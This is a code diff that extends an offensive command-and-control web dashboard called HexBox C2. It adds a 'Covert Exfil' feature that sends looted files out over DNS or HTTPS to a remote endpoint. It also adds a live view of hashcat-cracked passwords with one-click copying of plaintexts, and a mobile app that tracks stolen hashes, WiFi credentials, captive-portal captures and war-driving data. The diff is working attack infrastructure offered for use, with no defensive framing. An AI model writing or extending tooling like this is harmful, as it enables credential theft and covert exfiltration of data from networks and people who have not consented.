@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# ~/hexbox/c2/hexbox_c2.py — HexBox C2 Dashboard (Phase 5)
+# ~/hexbox/c2/hexbox_c2.py — HexBox C2 Dashboard (Phase 6)
 
 from flask import (Flask, render_template_string, request, jsonify,
                    send_file, session, redirect, Response)
@@ -41,6 +41,10 @@ _BH_CFG      = _CFG.get("bloodhound", {"url": "http://localhost:8080",
 _SLIVER_CFG  = _CFG.get("sliver",  {"host": "127.0.0.1", "port": 31337})
 _KISMET_CFG  = _CFG.get("kismet",  {"url": "http://localhost:2501",
                                      "username": "kismet", "password": "kismet"})
+_EXFIL_CFG   = _CFG.get("exfil",   {"dns_domain": "", "dns_server": "8.8.8.8",
+                                     "https_url": "", "https_token": "",
+                                     "aes_key": "change-me-to-32-byte-secret-key!",
+                                     "https_verify_tls": True})
 
 LOOT     = Path(os.path.expanduser(_HB.get("loot_dir",  "~/hexbox/loot")))
 LOGS     = Path(os.path.expanduser(_HB.get("log_dir",   "~/hexbox/logs")))
@@ -53,7 +57,7 @@ IFACE_BETTERCAP = _IF.get("bettercap", "wlan0")
 
 for d in (LOOT, LOGS, LOOT / "nmap", LOOT / "creds", LOOT / "reports",
           LOOT / "bloodhound", LOOT / "implants", LOOT / "bunny",
-          LOOT / "pcaps", LOOT / "portals", LOOT / "wardrive"):
+          LOOT / "pcaps", LOOT / "portals", LOOT / "wardrive", LOOT / "cracks"):
     d.mkdir(parents=True, exist_ok=True)
 
 # ---------------------------------------------------------------------------
@@ -108,11 +112,16 @@ def _try_put(q: queue.Queue, msg: str) -> bool:
 
 _known_loot: set[str] = set()
 _watcher_started = False
+_cracked_mtime: float = 0.0  # tracks last-seen mtime of cracked.txt
 
 
 def _loot_watcher():
-    global _known_loot
+    global _known_loot, _cracked_mtime
     _known_loot = {str(p) for p in LOOT.rglob("*") if p.is_file()}
+    cracked_path = LOOT / "cracked.txt"
+    if cracked_path.exists():
+        _cracked_mtime = cracked_path.stat().st_mtime
+
     while True:
         time.sleep(5)
         try:
@@ -128,6 +137,21 @@ def _loot_watcher():
                 })
                 _log(f"New loot: {rel} ({sz} bytes)")
             _known_loot = current
+
+            # Detect cracked.txt updates (hashcat writes to existing file)
+            if cracked_path.exists():
+                mtime = cracked_path.stat().st_mtime
+                if mtime > _cracked_mtime:
+                    _cracked_mtime = mtime
+                    try:
+                        lines = [l for l in cracked_path.read_text(errors="replace").splitlines() if l.strip()]
+                        broadcast("hash_cracked", {
+                            "count": len(lines),
+                            "ts":    datetime.now().strftime("%H:%M:%S"),
+                        })
+                        _log(f"Cracked passwords updated: {len(lines)} total")
+                    except Exception:
+                        pass
         except Exception:
             pass
 
@@ -618,6 +642,26 @@ tr:hover td{background:var(--bg2)}
   <pre id="sliver-out" style="max-height:140px;margin-top:6px;display:none"></pre>
   <div id="sliver-sessions" style="margin-top:4px"></div>
 </div>
+
+<div class="bar" style="margin-top:6px">
+  <h3>&#x1F4E4; Covert Exfil</h3>
+  <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">
+    <label>Method:</label>
+    <select id="exfil-method">
+      <option value="https">HTTPS</option>
+      <option value="dns">DNS</option>
+    </select>
+    <label>Target:</label>
+    <select id="exfil-target">
+      <option value="">All loot (zip)</option>
+    </select>
+    <button onclick="triggerExfil()" class="warn">&#x2191; Send</button>
+    <button onclick="loadExfilStatus()" class="dim">&#x21BA; Status</button>
+    <span id="exfil-status" style="color:#555;font-size:.78em;margin-left:8px"></span>
+  </div>
+  <div id="exfil-cfg" style="font-size:.75em;color:#555;margin-top:4px;font-family:monospace"></div>
+  <pre id="exfil-log" style="max-height:120px;margin-top:6px;display:none"></pre>
+</div>
 </div><!-- /pane-devices -->
 
 <!-- ========================= INTEL TAB ========================= -->
@@ -673,6 +717,14 @@ tr:hover td{background:var(--bg2)}
   <span id="portal-cred-count" style="color:#555;font-size:.78em;margin-left:8px"></span>
 </div>
 <div id="intel-portal-creds"><span style="color:#333">Click Refresh to load portal captures...</span></div>
+
+<div class="sec">&#x1F513; Cracked Passwords <span id="badge-cracked" style="color:#ff0;font-size:.8em;margin-left:8px"></span></div>
+<div class="row" style="border:none;padding:4px 0">
+  <button onclick="refreshCracked()" class="dim">&#x21BA; Refresh</button>
+  <button onclick="copyCracked()" class="dim">&#x2398; Copy Plaintexts</button>
+  <span id="cracked-status" style="color:#555;font-size:.78em;margin-left:8px"></span>
+</div>
+<div id="intel-cracked"><span style="color:#333">Click Refresh or run Hashcat to populate...</span></div>
 </div><!-- /pane-intel -->
 
 <!-- ========================= PAYLOADS TAB ========================= -->
@@ -893,6 +945,14 @@ function initSSE() {
     toast(`New loot: ${d.path}`);
   });
 
+  es.addEventListener('hash_cracked', e => {
+    const d = JSON.parse(e.data);
+    addFeedLine('new-loot', `[${d.ts}] 🔓 Hashcat: ${d.count} password(s) cracked`);
+    toast(`🔓 ${d.count} password(s) cracked!`);
+    document.getElementById('badge-cracked').textContent = d.count + ' cracked';
+    refreshCracked();
+  });
+
   es.addEventListener('proc_start', e => {
     const d = JSON.parse(e.data);
     addFeedLine('proc-start', `[${d.ts}] ▶ ${d.name} started (pid=${d.pid})`);
@@ -913,12 +973,13 @@ function showTab(name) {
     document.getElementById('pane-'+t).style.display = t===name ? '' : 'none';
     document.getElementById('btn-'+t).classList.toggle('active', t===name);
   });
-  if (name==='intel')    { refreshIntel(); refreshBH(); loadPcapList(); refreshPortalCreds(); }
+  if (name==='intel')    { refreshIntel(); refreshBH(); loadPcapList(); refreshPortalCreds(); refreshCracked(); }
   if (name==='loot')     refreshLoot();
   if (name==='logs')     tailLog();
   if (name==='payloads') { loadPayloadList(); }
   if (name==='report')   loadReportStats();
   if (name==='wardrive') refreshWardrive();
+  if (name==='devices')  loadExfilStatus();
 }
 
 // ---- Device helpers ----
@@ -1067,6 +1128,96 @@ function copyWifi() {
   if (!_intelData?.wifi?.length) { toast('No WiFi creds loaded','warn'); return; }
   copyText(_intelData.wifi.map(w=>`${w.ssid}:${w.password}`).join('\n'));
   toast(`Copied ${_intelData.wifi.length} WiFi cred(s)`);
+}
+
+// ---- Cracked passwords ----
+let _crackedData = [];
+
+async function refreshCracked() {
+  document.getElementById('cracked-status').textContent = 'Loading...';
+  try {
+    const j = await (await fetch('/intel/cracked')).json();
+    _crackedData = j.cracked || [];
+    document.getElementById('badge-cracked').textContent =
+      _crackedData.length ? `${_crackedData.length} cracked` : '';
+    document.getElementById('cracked-status').textContent =
+      `${_crackedData.length} password(s) cracked`;
+    renderCracked(_crackedData);
+  } catch(e) {
+    document.getElementById('cracked-status').textContent = 'Error: '+e;
+  }
+}
+
+function renderCracked(rows) {
+  const el = document.getElementById('intel-cracked');
+  if (!rows.length) {
+    el.innerHTML = '<span style="color:#333">No cracked passwords yet — run Hashcat</span>';
+    return;
+  }
+  el.innerHTML = '<table><tr><th>User</th><th>Domain</th><th>Plaintext</th><th>Type</th><th>Hash</th><th></th></tr>' +
+    rows.map(r =>
+      `<tr><td><b>${esc(r.user||'—')}</b></td><td>${esc(r.domain||'—')}</td>` +
+      `<td style="color:#0f0"><b>${esc(r.plaintext)}</b></td>` +
+      `<td style="color:#555;font-size:.72em">${esc(r.hash_type)}</td>` +
+      `<td style="font-family:monospace;font-size:.68em;color:#555">${esc(r.hash_preview)}</td>` +
+      `<td><button class="copy-btn dim" data-text="${esc(r.plaintext)}" onclick="copyText(this.dataset.text)">copy</button></td></tr>`
+    ).join('') + '</table>';
+}
+
+function copyCracked() {
+  if (!_crackedData.length) { toast('No cracked passwords loaded','warn'); return; }
+  copyText(_crackedData.map(r => r.user ? `${r.user}:${r.plaintext}` : r.plaintext).join('\n'));
+  toast(`Copied ${_crackedData.length} plaintext(s)`);
+}
+
+// ---- Exfil ----
+async function loadExfilStatus() {
+  const cfgEl = document.getElementById('exfil-cfg');
+  const logEl = document.getElementById('exfil-log');
+  const statEl = document.getElementById('exfil-status');
+  statEl.textContent = 'Loading...';
+  try {
+    const j = await (await fetch('/exfil/status')).json();
+    cfgEl.textContent =
+      `DNS domain: ${j.dns_domain||'(not set)'}  |  HTTPS URL: ${j.https_url||'(not set)'}  |  AES key: ${j.aes_key_set?'set':'(default — change me!)'}`;
+    if (cfgEl.textContent.includes('(default')) cfgEl.style.color='#c80';
+    else cfgEl.style.color='';
+    statEl.textContent = `Last exfil: ${j.last_ts||'never'}`;
+    if (j.log_lines && j.log_lines.length) {
+      logEl.style.display = '';
+      logEl.textContent = j.log_lines.slice(-20).join('\n');
+    }
+    // populate file selector
+    const sel = document.getElementById('exfil-target');
+    while (sel.options.length > 1) sel.remove(1);
+    (j.loot_files || []).forEach(f => {
+      const o = document.createElement('option');
+      o.value = f; o.textContent = f;
+      sel.add(o);
+    });
+  } catch(e) {
+    statEl.textContent = 'Error: '+e;
+  }
+}
+
+async function triggerExfil() {
+  const method = document.getElementById('exfil-method').value;
+  const target = document.getElementById('exfil-target').value;
+  const statEl = document.getElementById('exfil-status');
+  statEl.textContent = 'Sending...';
+  try {
+    const r = await fetch('/exfil/send', {method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({method, file: target||null})});
+    const j = await r.json();
+    if (j.error) { statEl.textContent='[ERR] '+j.error; toast(j.error,'warn'); return; }
+    statEl.textContent = j.ok ? `Sent (${j.bytes||'?'} B)` : `Failed: ${j.error||'unknown'}`;
+    toast(j.ok ? `Exfil OK via ${method}` : `Exfil failed: ${j.error||'?'}`, j.ok?'':'warn');
+    document.getElementById('exfil-log').style.display = '';
+    document.getElementById('exfil-log').textContent = JSON.stringify(j, null, 2);
+  } catch(e) {
+    statEl.textContent = 'Error: '+e;
+  }
 }
 
 // ---- Payload builder ----
@@ -1951,6 +2102,281 @@ def intel_netmap():
                     seen_ips.add(host["ip"])
                     hosts.append(host)
     return jsonify(hosts=hosts)
+
+
+@app.route("/intel/cracked")
+def intel_cracked():
+    try:
+        from parse_loot import parse_cracked_passwords
+    except ImportError:
+        import sys
+        sys.path.insert(0, str(Path(__file__).parent))
+        from parse_loot import parse_cracked_passwords
+    return jsonify(cracked=parse_cracked_passwords(LOOT))
+
+# ---------------------------------------------------------------------------
+# Routes — Covert exfil
+# ---------------------------------------------------------------------------
+
+_exfil_log: list[str] = []
+_exfil_lock = threading.Lock()
+
+
+def _exfil_import():
+    try:
+        import exfil as _exfil_mod
+        return _exfil_mod
+    except ImportError:
+        import sys
+        sys.path.insert(0, str(Path(__file__).parent))
+        import exfil as _exfil_mod
+        return _exfil_mod
+
+
+@app.route("/exfil/status")
+def exfil_status():
+    loot_files = [
+        str(p.relative_to(LOOT))
+        for p in sorted(LOOT.rglob("*"))
+        if p.is_file()
+    ]
+    with _exfil_lock:
+        log_lines = list(_exfil_log)
+    return jsonify(
+        dns_domain  = _EXFIL_CFG.get("dns_domain",  "") or "",
+        https_url   = _EXFIL_CFG.get("https_url",   "") or "",
+        aes_key_set = bool(_EXFIL_CFG.get("aes_key", "").strip()
+                           not in ("", "change-me-to-32-byte-secret-key!")),
+        last_ts     = log_lines[-1][:19] if log_lines else None,
+        log_lines   = log_lines,
+        loot_files  = loot_files,
+    )
+
+
+@app.route("/exfil/send", methods=["POST"])
+def exfil_send():
+    data   = request.get_json(silent=True) or {}
+    method = data.get("method", "https")
+    if method not in ("dns", "https"):
+        return jsonify(error="method must be 'dns' or 'https'"), 400
+    file_rel = data.get("file") or None
+
+    def _run():
+        mod = _exfil_import()
+        result = mod.exfil_loot(LOOT, _EXFIL_CFG, method, file_rel)
+        ts  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        msg = f"[{ts}] method={method} ok={result.get('ok')} bytes={result.get('bytes','?')} {result.get('error','')}"
+        with _exfil_lock:
+            _exfil_log.append(msg)
+            if len(_exfil_log) > 200:
+                del _exfil_log[:-200]
+        _log(f"Exfil {method}: {result}")
+        return result
+
+    try:
+        result = _run()
+        return jsonify(**result)
+    except Exception as e:
+        _log(f"Exfil error: {e}")
+        return jsonify(error=str(e), ok=False), 500
+
+
+@app.route("/exfil/log")
+def exfil_log_route():
+    with _exfil_lock:
+        return jsonify(log=list(_exfil_log))
+
+# ---------------------------------------------------------------------------
+# Routes — Mobile companion PWA
+# ---------------------------------------------------------------------------
+
+_MOBILE_HTML = """<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="theme-color" content="#0a0e0a">
+<link rel="manifest" href="/mobile/manifest.json">
+<title>HexBox</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0a0e0a;color:#c8ffc8;font-family:monospace;font-size:14px;padding:8px}
+h1{color:#00ff88;font-size:1.1em;border-bottom:1px solid #1a2e1a;padding-bottom:6px;margin-bottom:10px}
+.card{background:#0f180f;border:1px solid #1a2e1a;border-radius:6px;padding:10px;margin-bottom:8px}
+.card h2{font-size:.85em;color:#555;margin-bottom:6px;text-transform:uppercase;letter-spacing:.06em}
+.stat{display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid #0d150d}
+.stat:last-child{border-bottom:none}
+.v{color:#00ff88;font-weight:bold}
+.warn{color:#ff6}
+.err{color:#f44}
+.feed{max-height:220px;overflow-y:auto}
+.feed-item{padding:3px 0;border-bottom:1px solid #0d150d;font-size:.8em;color:#888}
+.feed-item.new{color:#0f0}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#333;margin-right:6px}
+.dot.ok{background:#0f0}
+.dot.err{background:#f00}
+.ts{color:#555;font-size:.75em}
+#status{position:fixed;top:4px;right:8px;font-size:.7em;color:#555}
+</style>
+</head>
+<body>
+<span id="status">⬡</span>
+<h1>⬡ HexBox C2 — Mobile</h1>
+
+<div class="card" id="card-ops">
+  <h2>&#x26A1; Operations</h2>
+  <div class="stat"><span>Hashes</span><span class="v" id="m-hashes">—</span></div>
+  <div class="stat"><span>WiFi creds</span><span class="v" id="m-wifi">—</span></div>
+  <div class="stat"><span>Hosts</span><span class="v" id="m-hosts">—</span></div>
+  <div class="stat"><span>Cracked</span><span class="v warn" id="m-cracked">—</span></div>
+  <div class="stat"><span>Portal caps</span><span class="v" id="m-portals">—</span></div>
+</div>
+
+<div class="card" id="card-procs">
+  <h2>&#x25B6; Processes</h2>
+  <div id="m-procs"><span style="color:#555">Loading...</span></div>
+</div>
+
+<div class="card">
+  <h2>&#x1F4F6; War-Drive</h2>
+  <div class="stat"><span>Networks seen</span><span class="v" id="m-nets">—</span></div>
+  <div class="stat"><span>Last update</span><span class="ts" id="m-wd-ts">—</span></div>
+</div>
+
+<div class="card">
+  <h2>&#x26A1; Live Feed</h2>
+  <div class="feed" id="m-feed"></div>
+</div>
+
+<script>
+const tok = document.cookie.match(/hexbox_tok=([^;]+)/)?.[1] || '';
+const hdrs = {'Content-Type':'application/json'};
+if(tok) hdrs['X-HexBox-Token'] = tok;
+
+async function get(url){
+  try{
+    const r = await fetch(url,{headers:hdrs});
+    if(!r.ok) throw new Error(r.status);
+    return r.json();
+  }catch(e){return null;}
+}
+
+async function refresh(){
+  const j = await get('/mobile/data');
+  if(!j){document.getElementById('status').textContent='⬡ err';return;}
+  document.getElementById('status').textContent = '⬡ ' + new Date().toLocaleTimeString();
+  document.getElementById('m-hashes').textContent  = j.hashes;
+  document.getElementById('m-wifi').textContent    = j.wifi;
+  document.getElementById('m-hosts').textContent   = j.hosts;
+  document.getElementById('m-cracked').textContent = j.cracked;
+  document.getElementById('m-portals').textContent = j.portals;
+  document.getElementById('m-nets').textContent    = j.wardrive_nets;
+  document.getElementById('m-wd-ts').textContent   = j.wardrive_ts || '—';
+  const procs = document.getElementById('m-procs');
+  if(j.procs && j.procs.length){
+    procs.innerHTML = j.procs.map(p=>
+      `<div class="stat"><span><span class="dot ok"></span>${p.name}</span><span class="ts">pid ${p.pid}</span></div>`
+    ).join('');
+  }else{
+    procs.innerHTML='<span style="color:#555">No active processes</span>';
+  }
+}
+
+function addFeed(cls,msg){
+  const d=document.getElementById('m-feed');
+  const el=document.createElement('div');
+  el.className='feed-item '+cls;
+  el.textContent=msg;
+  d.insertBefore(el,d.firstChild);
+  while(d.children.length>30)d.lastChild.remove();
+}
+
+const es = new EventSource('/events');
+es.onopen  = ()=>document.getElementById('status').textContent='⬡ live';
+es.onerror = ()=>document.getElementById('status').textContent='⬡ err';
+es.addEventListener('new_loot',   e=>{const d=JSON.parse(e.data);addFeed('new','['+d.ts+'] New loot: '+d.path);refresh();});
+es.addEventListener('proc_start', e=>{const d=JSON.parse(e.data);addFeed('','['+d.ts+'] Started: '+d.name);refresh();});
+es.addEventListener('proc_stop',  e=>{const d=JSON.parse(e.data);addFeed('','['+d.ts+'] Stopped: '+d.name);refresh();});
+es.addEventListener('hash_cracked',e=>{const d=JSON.parse(e.data);addFeed('new','['+d.ts+'] Cracked: '+d.count+' password(s)');refresh();});
+
+refresh();
+setInterval(refresh, 30000);
+</script>
+</body></html>"""
+
+
+@app.route("/mobile")
+def mobile_dashboard():
+    return _MOBILE_HTML, 200, {"Content-Type": "text/html; charset=utf-8"}
+
+
+@app.route("/mobile/manifest.json")
+def mobile_manifest():
+    return jsonify({
+        "name": "HexBox C2",
+        "short_name": "HexBox",
+        "start_url": "/mobile",
+        "display": "standalone",
+        "background_color": "#0a0e0a",
+        "theme_color": "#00ff88",
+        "icons": [{"src": "/favicon.ico", "sizes": "any", "type": "image/x-icon"}],
+    })
+
+
+@app.route("/mobile/data")
+def mobile_data():
+    """Lightweight JSON data endpoint for the mobile companion app."""
+    try:
+        from parse_loot import aggregate_intel, parse_cracked_passwords
+    except ImportError:
+        import sys
+        sys.path.insert(0, str(Path(__file__).parent))
+        from parse_loot import aggregate_intel, parse_cracked_passwords
+
+    intel   = aggregate_intel(LOOT, LOGS)
+    cracked = parse_cracked_passwords(LOOT)
+
+    # wardrive quick stats
+    wd_file = LOOT / "wardrive" / "networks.json"
+    wd_nets = 0
+    wd_ts   = None
+    if wd_file.exists():
+        try:
+            wd_data = json.loads(wd_file.read_text())
+            wd_nets = len(wd_data) if isinstance(wd_data, list) else 0
+            wd_ts   = datetime.fromtimestamp(wd_file.stat().st_mtime).strftime("%H:%M")
+        except Exception:
+            pass
+
+    # portal captures count
+    portal_file = LOOT / "portals" / "captures.json"
+    portals = 0
+    if portal_file.exists():
+        try:
+            portals = len(json.loads(portal_file.read_text()))
+        except Exception:
+            pass
+
+    # active procs
+    with _procs_lock:
+        procs = [
+            {"name": name, "pid": p.pid}
+            for name, p in _procs.items()
+            if p.poll() is None
+        ]
+
+    return jsonify(
+        hashes       = len(intel.get("hashes", [])),
+        wifi         = len(intel.get("wifi",   [])),
+        hosts        = len(intel.get("hosts",  [])),
+        cracked      = len(cracked),
+        portals      = portals,
+        wardrive_nets = wd_nets,
+        wardrive_ts  = wd_ts,
+        procs        = procs,
+    )
 
 # ---------------------------------------------------------------------------
 # Routes — Payload builder
@@ -3282,7 +3708,7 @@ if __name__ == "__main__":
         t = threading.Thread(target=_loot_watcher, daemon=True)
         t.start()
 
-    print(f"[+] HexBox C2 (Phase 5) online → http://0.0.0.0:{PORT}")
+    print(f"[+] HexBox C2 (Phase 6) online → http://0.0.0.0:{PORT}")
     if not os.environ.get("HEXBOX_TOKEN") and not _HB.get("api_token"):
         print(f"[!] Access token (set HEXBOX_TOKEN env var to pin): {_TOKEN}")
     print(f"[!] SSH host-key verification is DISABLED (AutoAddPolicy) — see README for hardening")
